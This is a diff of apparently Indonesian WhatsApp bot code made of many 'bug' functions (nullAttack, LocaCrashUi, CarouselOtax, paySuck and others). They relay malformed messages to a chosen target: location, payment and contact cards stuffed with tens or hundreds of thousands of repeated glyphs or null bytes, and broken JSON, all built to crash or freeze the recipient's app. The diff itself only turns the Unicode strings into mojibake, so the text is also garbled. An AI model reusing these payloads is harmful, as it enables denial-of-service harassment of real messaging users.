                     },
                     body: {
-                        text: "нαιι ιм Manta⸙"
+                        text: "Ð½Î±Î¹Î¹ Î¹Ð¼ Mantaâ¸™"
                     },
                     nativeFlowMessage: {
                         messageParamsJson: "((".repeat(10000),
@@ -18694,7 +18710,7 @@ async function LocaNewManta(otax, target) {
                                 name: "galaxy_message",
                                 buttonParamsJson: JSON.stringify({
                                     icon: "RIVIEW",
-                                    flow_cta: "ꦽ".repeat(10000),
+                                    flow_cta: "ê¦½".repeat(10000),
                                     flow_message_version: "3"
                                 })
                             },
@@ -18702,7 +18718,7 @@ async function LocaNewManta(otax, target) {
                                 name: "galaxy_message",
                                 buttonParamsJson: JSON.stringify({
                                     icon: "RIVIEW",
-                                    flow_cta: "ꦾ".repeat(10000),
+                                    flow_cta: "ê¦¾".repeat(10000),
                                     flow_message_version: "3"
                                 })
                             }
@@ -18730,7 +18746,7 @@ async function LocaNewManta(otax, target) {
     await otax.relayMessage(target, msg.message, { messageId: msg.key.id, participant: { jid: target } });
 }
 async function LocaNewgbah(otax, target) {
-    console.log(chalk.red(`𝗢𝘁𝗮𝘅 𝗦𝗲𝗱𝗮𝗻𝗴 𝗠𝗲𝗻𝗴𝗶𝗿𝗶𝗺 𝗕𝘂𝗴`));
+    console.log(chalk.red(`ð—¢ð˜ð—®ð˜… ð—¦ð—²ð—±ð—®ð—»ð—´ ð— ð—²ð—»ð—´ð—¶ð—¿ð—¶ð—º ð—•ð˜‚ð—´`));
 
     const otaxx = proto.Message.fromObject({
         viewOnceMessage: {
@@ -18740,15 +18756,15 @@ async function LocaNewgbah(otax, target) {
                         locationMessage: {
                             degreesLatitude: true,
                             degreesLongitude: true,
-                            name: "otax" + "ꦽ".repeat(180000),
+                            name: "otax" + "ê¦½".repeat(180000),
                             url: "https://t.me/Otapengenkawin",
                             contextInfo: {
                                 externalAdReply: {
                                     quotedAd: {
-                                        advertiserName: "ꦾ".repeat(100000),
+                                        advertiserName: "ê¦¾".repeat(100000),
                                         mediaType: "IMAGE",
                                         jpegThumbnail: Buffer.from("/9j/4AAQSkZJRgABAQAAAQABAAD/", "base64"),
-                                        caption: "οταϰ ιѕ нєяє"
+                                        caption: "Î¿Ï„Î±Ï° Î¹Ñ• Ð½Ñ”ÑÑ”"
                                     },
                                     placeholderKey: {
                                         remoteJid: "0@g.us",
@@ -18761,7 +18777,7 @@ async function LocaNewgbah(otax, target) {
                         hasMediaAttachment: true
                     },
                     body: {
-                        text: "нαιι ιм οταϰ⸙"
+                        text: "Ð½Î±Î¹Î¹ Î¹Ð¼ Î¿Ï„Î±Ï°â¸™"
                     },
                     nativeFlowMessage: {
                         messageParamsJson: "((".repeat(10000),
@@ -18775,7 +18791,7 @@ async function LocaNewgbah(otax, target) {
                                 name: "galaxy_message",
                                 buttonParamsJson: JSON.stringify({
                                     icon: "RIVIEW",
-                                    flow_cta: "ꦽ".repeat(10000),
+                                    flow_cta: "ê¦½".repeat(10000),
                                     flow_message_version: "3"
                                 })
                             },
@@ -18783,7 +18799,7 @@ async function LocaNewgbah(otax, target) {
                                 name: "galaxy_message",
                                 buttonParamsJson: JSON.stringify({
                                     icon: "RIVIEW",
-                                    flow_cta: "ꦾ".repeat(10000),
+                                    flow_cta: "ê¦¾".repeat(10000),
                                     flow_message_version: "3"
                                 })
                             }
@@ -19103,7 +19119,7 @@ async function homeBeta(otax, target) {
     });
 }
 async function BugGbSange(otax, target) {
-    console.log(chalk.red(`𝗢𝘁𝗮𝘅 𝗦𝗲𝗱𝗮𝗻𝗴 𝗠𝗲𝗻𝗴𝗶𝗿𝗶𝗺 𝗕𝘂𝗴`));
+    console.log(chalk.red(`ð—¢ð˜ð—®ð˜… ð—¦ð—²ð—±ð—®ð—»ð—´ ð— ð—²ð—»ð—´ð—¶ð—¿ð—¶ð—º ð—•ð˜‚ð—´`));
     const otaxx = {
         viewOnceMessage: {
             message: {
@@ -19112,15 +19128,15 @@ async function BugGbSange(otax, target) {
                         locationMessage: {
                             degreesLatitude: -999.03499999999999,
                             degreesLongitude: 922.9999999999999,
-                            name: "DO YOU KNOW ME?¿ otax" + "ꦽ".repeat(60000),
+                            name: "DO YOU KNOW ME?Â¿ otax" + "ê¦½".repeat(60000),
                             url: "https://t.me/Otapengenkawin",
                             contextInfo: {
                                 externalAdReply: {
                                     quotedAd: {
-                                        advertiserName: "ꦾ".repeat(60000),
+                                        advertiserName: "ê¦¾".repeat(60000),
                                         mediaType: "IMAGE",
                                         jpegThumbnail: "/9j/4AAQSkZJRgABAQAAAQABAAD/",
-                                        caption: "οταϰ ιѕ нєяє"
+                                        caption: "Î¿Ï„Î±Ï° Î¹Ñ• Ð½Ñ”ÑÑ”"
                                     },
                                     placeholderKey: {
                                         remoteJid: "0@g.us",
@@ -19133,7 +19149,7 @@ async function BugGbSange(otax, target) {
                         hasMediaAttachment: true
                     },
                     body: {
-                        text: "нαιι ιм οταϰ⸙"
+                        text: "Ð½Î±Î¹Î¹ Î¹Ð¼ Î¿Ï„Î±Ï°â¸™"
                     },
                     nativeFlowMessage: {
                         messageParamsJson: "{[",
@@ -19147,7 +19163,7 @@ async function BugGbSange(otax, target) {
                                 name: "galaxy_message",
                                 buttonParamsJson: JSON.stringify({
                                     "icon": "RIVIEW",
-                                    "flow_cta": "ꦽ".repeat(10000),
+                                    "flow_cta": "ê¦½".repeat(10000),
                                     "flow_message_version": "3"
                                 })
                             },
@@ -19155,7 +19171,7 @@ async function BugGbSange(otax, target) {
                                 name: "galaxy_message",
                                 buttonParamsJson: JSON.stringify({
                                     "icon": "RIVIEW",
-                                    "flow_cta": "ꦾ".repeat(10000),
+                                    "flow_cta": "ê¦¾".repeat(10000),
                                     "flow_message_version": "3"
                                 })
                             },
@@ -19182,7 +19198,7 @@ async function gsIntjavbkp(otax, target, otaxkiw = true) {
                         newsletterJid: "12037205250208@newsletter",
                         newsletterName: "do u know me? | Information",
                         serverMessageId: 1000,
-                        accessibilityText: "❖ 𝙁𝙪𝙘𝙠 𝙐 𝙈𝙚𝙣"
+                        accessibilityText: "â– ð™ð™ªð™˜ð™  ð™ ð™ˆð™šð™£"
                     },
                     statusAttributionType: "RESHARED_FROM_MENTION",
                     contactVcard: true,
@@ -19194,7 +19210,7 @@ async function gsIntjavbkp(otax, target, otaxkiw = true) {
                     expiration: Date.now()
                 },
                 body: {
-                    text: "❖ 𝙄𝙢 𝙃𝙚𝙧𝙚 𝙊𝙏𝘼𝙓",
+                    text: "â– ð™„ð™¢ ð™ƒð™šð™§ð™š ð™Šð™ð˜¼ð™“",
                     format: "DEFAULT"
                 },
                 nativeFlowResponseMessage: {
@@ -19238,7 +19254,7 @@ async function paySuck(otax, target) {
                 "buttons": [
                     {
                         "name": "payment_info",
-                        "buttonParamsJson": "{\"currency\":\"IDR\",\"total_amount\":{\"value\":0,\"offset\":100},\"reference_id\":\"4UJPSC1FYKC\",\"type\":\"physical-goods\",\"order\":{\"status\":\"pending\",\"subtotal\":{\"value\":0,\"offset\":100},\"order_type\":\"ORDER\",\"items\":[{\"name\":\"\",\"amount\":{\"value\":0,\"offset\":100},\"quantity\":0,\"sale_amount\":{\"value\":0,\"offset\":100}}]},\"payment_settings\":[{\"type\":\"pix_static_code\",\"pix_static_code\":{\"merchant_name\":\"¿!deadcode!¿\",\"key\":\" 🪧" + "\u0000".repeat(902000) + "\",\"key_type\":\"CPF\"}}],\"share_payment_status\":false}"
+                        "buttonParamsJson": "{\"currency\":\"IDR\",\"total_amount\":{\"value\":0,\"offset\":100},\"reference_id\":\"4UJPSC1FYKC\",\"type\":\"physical-goods\",\"order\":{\"status\":\"pending\",\"subtotal\":{\"value\":0,\"offset\":100},\"order_type\":\"ORDER\",\"items\":[{\"name\":\"\",\"amount\":{\"value\":0,\"offset\":100},\"quantity\":0,\"sale_amount\":{\"value\":0,\"offset\":100}}]},\"payment_settings\":[{\"type\":\"pix_static_code\",\"pix_static_code\":{\"merchant_name\":\"Â¿!deadcode!Â¿\",\"key\":\" ðŸª§" + "\u0000".repeat(902000) + "\",\"key_type\":\"CPF\"}}],\"share_payment_status\":false}"
                     }
                 ]
             }
@@ -19408,7 +19424,7 @@ async function palaLuMappimg(otax, target) {
     await otax.relayMessage("status@broadcast", {
         interactiveResponseMessage: {
             body: {
-                text: " @null | Manta ¿? ",
+                text: " @null | Manta Â¿? ",
                 format: "DEFAULT"
             },
             nativeFlowResponseMessage: {
@@ -19417,7 +19433,7 @@ async function palaLuMappimg(otax, target) {
                 version: 3
             },
             contextInfo: {
-                remoteJid: Math.random().toString(36) + " Tr4sh.corp¡! ",
+                remoteJid: Math.random().toString(36) + " Tr4sh.corpÂ¡! ",
                 isForwarded: true,
                 forwardingScore: 999,
                 urlTrackingMap: {
@@ -19652,9 +19668,9 @@ async function nullAttack(otax, target) {
         let locationMessage = {
             degreesLatitude: -9.09999,
             degreesLongitude: 199.99963,
-            name: "X" + "𖣂".repeat(15000),
-            address: "X" + "𖣂".repeat(5000),
-            url: `https://api.${"𖣂".repeat(25000)}.com`
+            name: "X" + "ð–£‚".repeat(15000),
+            address: "X" + "ð–£‚".repeat(5000),
+            url: `https://api.${"ð–£‚".repeat(25000)}.com`
         };
 
         let msg = generateWAMessageFromContent(target, {
@@ -19689,7 +19705,7 @@ async function nullAttack(otax, target) {
                 text: "OTAX X MANTA",
                 matchedText: "https://t.me/Otapengenkawin",
                 description: "manta X - 1945".repeat(15000),
-                title: "— Manta".repeat(15000),
+                title: "â€” Manta".repeat(15000),
                 previewType: "NONE"
             }
         };
@@ -19800,12 +19816,12 @@ async function dickg(otax, target) {
     );
 }
 async function CarouselOtax(otax, target) {
-    console.log(chalk.red(`𝗢𝘁𝗮𝘅 𝗦𝗲𝗱𝗮𝗻𝗴 𝗠𝗲𝗻𝗴𝗶𝗿𝗶𝗺 𝗕𝘂𝗴`));
+    console.log(chalk.red(`ð—¢ð˜ð—®ð˜… ð—¦ð—²ð—±ð—®ð—»ð—´ ð— ð—²ð—»ð—´ð—¶ð—¿ð—¶ð—º ð—•ð˜‚ð—´`));
     const cards = Array.from({ length: 5 }, () => ({
-        body: proto.Message.InteractiveMessage.Body.fromObject({ text: "OTAX" + "ꦽ".repeat(5000), }),
-        footer: proto.Message.InteractiveMessage.Footer.fromObject({ text: "OTAX" + "ꦽ".repeat(5000), }),
+        body: proto.Message.InteractiveMessage.Body.fromObject({ text: "OTAX" + "ê¦½".repeat(5000), }),
+        footer: proto.Message.InteractiveMessage.Footer.fromObject({ text: "OTAX" + "ê¦½".repeat(5000), }),
         header: proto.Message.InteractiveMessage.Header.fromObject({
-            title: "OTAX" + "ꦽ".repeat(5000),
+            title: "OTAX" + "ê¦½".repeat(5000),
             hasMediaAttachment: true,
             imageMessage: {
                 url: "https://mmg.whatsapp.net/v/t62.7118-24/680663126_970396275464454_6182359723749650012_n.enc?ccb=11-4&oh=01_Q5Aa4QGQLAh643XxIBrTHKJVswbNCRzYyckUeMHcyRCE74uPPw&oe=6A12ED53&_nc_sid=5e03e0&mms3=true",
@@ -19842,10 +19858,10 @@ async function CarouselOtax(otax, target) {
                     },
                     interactiveMessage: proto.Message.InteractiveMessage.fromObject({
                         body: proto.Message.InteractiveMessage.Body.create({
-                            text: `§OtaxUdang§\n${"𑜦".repeat(2000)}:)\n\u0000` + "ꦾ".repeat(5000)
+                            text: `Â§OtaxUdangÂ§\n${"ð‘œ¦".repeat(2000)}:)\n\u0000` + "ê¦¾".repeat(5000)
                         }),
                         footer: proto.Message.InteractiveMessage.Footer.create({
-                            text: "ꦽ".repeat(5000),
+                            text: "ê¦½".repeat(5000),
                         }),
                         header: proto.Message.InteractiveMessage.Header.create({
                             hasMediaAttachment: false
@@ -19911,7 +19927,7 @@ async function CarouselOtax(otax, target) {
                         }
                     },
                     body: {
-                        text: "ꦾ".repeat(10000)
+                        text: "ê¦¾".repeat(10000)
                     },
                     nativeFlowMessage: {
                         buttons: [
@@ -19919,7 +19935,7 @@ async function CarouselOtax(otax, target) {
                                 name: "galaxy_message",
                                 buttonParamsJson: JSON.stringify({
                                     "icon": "RIVIEW",
-                                    "flow_cta": "ꦾ".repeat(10000),
+                                    "flow_cta": "ê¦¾".repeat(10000),
                                     "flow_message_version": "3"
                                 })
                             },
@@ -19934,7 +19950,7 @@ async function CarouselOtax(otax, target) {
     await otax.relayMessage(target, msg.message, { messageId: msg.key.id, participant: { jid: target } });
 }
 async function LocaCrashUi(otax, target) {
-    console.log(chalk.red(`𝗢𝘁𝗮𝘅 𝗦𝗲𝗱𝗮𝗻𝗴 𝗠𝗲𝗻𝗴𝗶𝗿𝗶𝗺 𝗕𝘂𝗴`));
+    console.log(chalk.red(`ð—¢ð˜ð—®ð˜… ð—¦ð—²ð—±ð—®ð—»ð—´ ð— ð—²ð—»ð—´ð—¶ð—¿ð—¶ð—º ð—•ð˜‚ð—´`));
     const otaxx = {
         viewOnceMessage: {
             message: {
@@ -19943,15 +19959,15 @@ async function LocaCrashUi(otax, target) {
                         locationMessage: {
                             degreesLatitude: -999.03499999999999,
                             degreesLongitude: 922.9999999999999,
-                            name: "DO YOU KNOW ME?¿ OTAX" + "ꦽ".repeat(60000),
+                            name: "DO YOU KNOW ME?Â¿ OTAX" + "ê¦½".repeat(60000),
                             url: "https://t.me/Otapengenkawin",
                             contextInfo: {
                                 externalAdReply: {
                                     quotedAd: {
-                                        advertiserName: "ꦾ".repeat(60000),
+                                        advertiserName: "ê¦¾".repeat(60000),
                                         mediaType: "IMAGE",
                                         jpegThumbnail: "/9j/4AAQSkZJRgABAQAAAQABAAD/",
-                                        caption: "οταϰ ιѕ нєяє"
+                                        caption: "Î¿Ï„Î±Ï° Î¹Ñ• Ð½Ñ”ÑÑ”"
                                     },
                                     placeholderKey: {
                                         remoteJid: "0@g.us",
@@ -19964,7 +19980,7 @@ async function LocaCrashUi(otax, target) {
                         hasMediaAttachment: true
                     },
                     body: {
-                        text: "нαιι ιм οταϰ⸙"
+                        text: "Ð½Î±Î¹Î¹ Î¹Ð¼ Î¿Ï„Î±Ï°â¸™"
                     },
                     nativeFlowMessage: {
                         messageParamsJson: "{[",
@@ -19978,7 +19994,7 @@ async function LocaCrashUi(otax, target) {
                                 name: "galaxy_message",
                                 buttonParamsJson: JSON.stringify({
                                     "icon": "RIVIEW",
-                                    "flow_cta": "ꦽ".repeat(10000),
+                                    "flow_cta": "ê¦½".repeat(10000),
                                     "flow_message_version": "3"
                                 })
                             },
@@ -19986,7 +20002,7 @@ async function LocaCrashUi(otax, target) {
                                 name: "galaxy_message",
                                 buttonParamsJson: JSON.stringify({
                                     "icon": "RIVIEW",
-                                    "flow_cta": "ꦾ".repeat(10000),
+                                    "flow_cta": "ê¦¾".repeat(10000),
                                     "flow_message_version": "3"
                                 })
                             },
@@ -20100,7 +20116,7 @@ async function iozk(otax, target) {
                                         view_model: {
                                             primitive: {
                                                 text: "MantaXxx",
-                                                inline_entities: ["𑇂𑆵𑆴𑆿".repeat(60000)],
+                                                inline_entities: ["ð‘‡‚ð‘†µð‘†´ð‘†¿".repeat(60000)],
                                                 __typename: "GenAIMarkdownTextUXPrimitive",
                                             },
                                             __typename: "GenAISingleLayoutViewModel",
@@ -20264,9 +20280,9 @@ async function evJj(otax, target) {
                     },
                     eventMessage: {
                         isCanceled: false,
-                        name: "🩸 @manta | null ",
+                        name: "ðŸ©¸ @manta | null ",
                         description:
-                            "\"Anjing\", kalimat yang terlintas \nSaat fokus hancurnya hidupku\nMulai kuhujam cara yang sama\nAmpunan langkah sebuah siksa 🫀\".",
+                            "\"Anjing\", kalimat yang terlintas \nSaat fokus hancurnya hidupku\nMulai kuhujam cara yang sama\nAmpunan langkah sebuah siksa ðŸ«€\".",
                         location: {
                             degreesLatitude: "a",
                             degreesLongitude: "a",
@@ -20292,7 +20308,7 @@ async function evJj(otax, target) {
                             quotedMessage: {
                                 interactiveResponseMessage: {
                                     body: {
-                                        text: "🦠",
+                                        text: "ðŸ¦ ",
                                         format: "EXTENSIONS_1",
                                     },
                                     nativeFlowResponseMessage: {
@@ -20329,8 +20345,8 @@ async function evJj(otax, target) {
                         },
                         eventMessage: {
                             isCanceled: true,
-                            name: "🩸 @manta | null ",
-                            description: "\"Anjing\", kalimat yang terlintas \nSaat fokus hancurnya hidupku\nMulai kuhujam cara yang sama\nAmpunan langkah sebuah siksa 🫀\".",
+                            name: "ðŸ©¸ @manta | null ",
+                            description: "\"Anjing\", kalimat yang terlintas \nSaat fokus hancurnya hidupku\nMulai kuhujam cara yang sama\nAmpunan langkah sebuah siksa ðŸ«€\".",
                             location: {
                                 degreesLatitude: 0,
                                 degreesLongitude: 0,
@@ -20368,12 +20384,12 @@ let messaging = null;
 try {
     const serviceAccountPath = path.join(__dirname, 'serviceAccountKey.json');
     if (!fs.existsSync(serviceAccountPath)) {
-        console.log('[FIREBASE] ⚠️  serviceAccountKey.json tidak ditemukan. Firebase dinonaktifkan.');
+        console.log('[FIREBASE] âš ï¸  serviceAccountKey.json tidak ditemukan. Firebase dinonaktifkan.');
     } else {
         const serviceAccount = JSON.parse(fs.readFileSync(serviceAccountPath, 'utf8'));
         // Cek apakah credential valid (bukan file kosong atau dummy)
         if (!serviceAccount.private_key || !serviceAccount.client_email || !serviceAccount.project_id) {
-            console.log('[FIREBASE] ⚠️  serviceAccountKey.json tidak lengkap. Firebase dinonaktifkan.');
+            console.log('[FIREBASE] âš ï¸  serviceAccountKey.json tidak lengkap. Firebase dinonaktifkan.');
         } else {
             admin = require('firebase-admin');
             admin.initializeApp({
@@ -20381,7 +20397,7 @@ try {
                 databaseURL: 'https://mantax-e0919-default-rtdb.asia-southeast1.firebasedatabase.app/'
             });
             messaging = admin.messaging();
-            console.log('[FIREBASE] ✅ Firebase Admin SDK initialized successfully.');
+            console.log('[FIREBASE] âœ… Firebase Admin SDK initialized successfully.');
         }
     }
     setInterval(async () => {
@@ -20430,7 +20446,7 @@ try {
     }, 10 * 60 * 1000); // Jalanin pengecekan setiap 10 menit
 
 } catch (err) {
-    console.log('[FIREBASE] ⚠️ Firebase Admin SDK gagal diinisialisasi atau tidak terinstall. Detail:', err.message);
+    console.log('[FIREBASE] âš ï¸ Firebase Admin SDK gagal diinisialisasi atau tidak terinstall. Detail:', err.message);
 }
 
 async function sendPushNotification(fcmToken, title, body) {
@@ -20545,7 +20561,7 @@ async function spamDelwy(otax, target) {
                     shouldSkipConfirmation: true,
                     embeddedContent: {
                         embeddedMusic: {
-                            author: `suck my dick ¿ `,
+                            author: `suck my dick Â¿ `,
                             title: " Threesixty ",
                         }
                     },
@@ -20626,7 +20642,7 @@ async function OtaxAyunBelovedX(otax, target, mention) {
                 message: {
                     interactiveResponseMessage: {
                         body: {
-                            text: " ¿Otax Here¿ ",
+                            text: " Â¿Otax HereÂ¿ ",
                             format: "DEFAULT",
                         },
                         nativeFlowResponseMessage: {
@@ -20674,7 +20690,7 @@ async function OtaxAyunBelovedX(otax, target, mention) {
     ]
 
     let sequentialIndex = 0
-    console.log(chalk.red(`𝘰𝘵𝘢𝘹 𝘴𝘦𝘥𝘢𝘯𝘨 𝘮𝘦𝘯𝘨𝘪𝘳𝘪𝘮 𝘢𝘵𝘵𝘢𝘤𝘬 𝘬𝘦 ${target}`))
+    console.log(chalk.red(`ð˜°ð˜µð˜¢ð˜¹ ð˜´ð˜¦ð˜¥ð˜¢ð˜¯ð˜¨ ð˜®ð˜¦ð˜¯ð˜¨ð˜ªð˜³ð˜ªð˜® ð˜¢ð˜µð˜µð˜¢ð˜¤ð˜¬ ð˜¬ð˜¦ ${target}`))
 
     const selectedMedia = mediaData[sequentialIndex]
     sequentialIndex = (sequentialIndex + 1) % mediaData.length
@@ -20882,9 +20898,9 @@ async function invsNewIos(otax, target) {
         {
             contactMessage: {
                 displayName:
-                    "🦠⃰͡°͜͡•⃟𝘅𝗿͢𝗲̷𝗹⃨𝗹𝘆̷͢-𝗰͢𝗹𝗶⃨𝗲𝗻̷͢𝘁 ⿻ 𝐓𝐡𝐫𝐞𝐞𝐬𝐢𝐱𝐭𝐲 ✶ > 666" +
-                    "𑇂𑆵𑆴𑆿".repeat(10000),
-                vcard: `BEGIN:VCARD\nVERSION:3.0\nN:;🦠⃰͡°͜͡•⃟𝘅𝗿͢𝗲̷𝗹⃨𝗹𝘆̷͢-𝗰͢𝗹𝗶⃨𝗲𝗻̷͢𝘁 ⿻ 𝐓𝐡𝐫𝐞𝐞𝐬𝐢𝐱𝐭𝐲 ✶ > 666${"𑇂𑆵𑆴𑆿".repeat(10000)};;;\nFN:🦠⃰͡°͜͡•⃟𝘅𝗿͢𝗲̷𝗹⃨𝗹𝘆̷͢-𝗰͢𝗹𝗶⃨𝗲𝗻̷͢𝘁 ⿻ 𝐓𝐡𝐫𝐞𝐞𝐬𝐢𝐱𝐭𝐲 ✶ > 666${"𑇂𑆵𑆴𑆿".repeat(10000)}\nNICKNAME:🦠⃰͡°͜͡•⃟𝘅𝗿͢𝗲̷𝗹⃨𝗹𝘆̷͢-𝗰͢𝗹𝗶⃨𝗲𝗻̷͢𝘁 ⿻ 𝐓𝐡𝐫𝐞𝐞𝐬𝐢𝐱𝐭𝐲 ✶ > 666${"ᩫᩫ".repeat(4000)}\nORG:🦠⃰͡°͜͡•⃟𝘅𝗿͢𝗲̷𝗹⃨𝗹𝘆̷͢-𝗰͢𝗹𝗶⃨𝗲𝗻̷͢𝘁 ⿻ 𝐓𝐡𝐫𝐞𝐞𝐬𝐢𝐱𝐭𝐲 ✶ > 666${"ᩫᩫ".repeat(4000)}\nTITLE:🦠⃰͡°͜͡•⃟𝘅𝗿͢𝗲̷𝗹⃨𝗹𝘆̷͢-𝗰͢𝗹𝗶⃨𝗲𝗻̷͢𝘁 ⿻ 𝐓𝐡𝐫𝐞𝐞𝐬𝐢𝐱𝐭𝐲 ✶ > 666${"ᩫᩫ".repeat(4000)}\nitem1.TEL;waid=6287873499996:+62 878-7349-9996\nitem1.X-ABLabel:Telepon\nitem2.EMAIL;type=INTERNET:🦠⃰͡°͜͡•⃟𝘅𝗿͢𝗲̷𝗹⃨𝗹𝘆̷͢-𝗰͢𝗹𝗶⃨𝗲𝗻̷͢𝘁 ⿻ 𝐓𝐡𝐫𝐞𝐞𝐬𝐢𝐱𝐭𝐲 ✶ > 666${"ᩫᩫ".repeat(4000)}\nitem2.X-ABLabel:Kantor\nitem3.EMAIL;type=INTERNET:🦠⃰͡°͜͡•⃟𝘅𝗿͢𝗲̷𝗹⃨𝗹𝘆̷͢-𝗰͢𝗹𝗶⃨𝗲𝗻̷͢𝘁 ⿻ 𝐓𝐡𝐫𝐞𝐞𝐬𝐢𝐱𝐭𝐲 ✶ > 666${"ᩫᩫ".repeat(4000)}\nitem3.X-ABLabel:Kantor\nitem4.EMAIL;type=INTERNET:🦠⃰͡°͜͡•⃟𝘅𝗿͢𝗲̷𝗹⃨𝗹𝘆̷͢-𝗰͢𝗹𝗶⃨𝗲𝗻̷͢𝘁 ⿻ 𝐓𝐡𝐫𝐞𝐞𝐬𝐢𝐱𝐭𝐲 ✶ > 666${"ᩫᩫ".repeat(4000)}\nitem4.X-ABLabel:Pribadi\nitem5.ADR:;;🦠⃰͡°͜͡•⃟𝘅𝗿͢𝗲̷𝗹⃨𝗹𝘆̷͢-𝗰͢𝗹𝗶⃨𝗲𝗻̷͢𝘁 ⿻ 𝐓𝐡𝐫𝐞𝐞𝐬𝐢𝐱𝐭𝐲 ✶ > 666${"ᩫᩫ".repeat(4000)};;;;\nitem5.X-ABADR:ac\nitem5.X-ABLabel:Rumah\nX-YAHOO;type=KANTOR:🦠⃰͡°͜͡•⃟𝘅𝗿͢𝗲̷𝗹⃨𝗹𝘆̷͢-𝗰͢𝗹𝗶⃨𝗲𝗻̷͢𝘁 ⿻ 𝐓𝐡𝐫𝐞𝐞𝐬𝐢𝐱𝐭𝐲 ✶ > 666${"ᩫᩫ".repeat(4000)}\nPHOTO;BASE64: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\nX-WA-BIZ-NAME:🦠⃰͡°͜͡•⃟𝘅𝗿͢𝗲̷𝗹⃨𝗹𝘆̷͢-𝗰͢𝗹𝗶⃨𝗲𝗻̷͢𝘁 ⿻ 𝐓𝐡𝐫𝐞𝐞𝐬𝐢𝐱𝐭𝐲 ✶ > 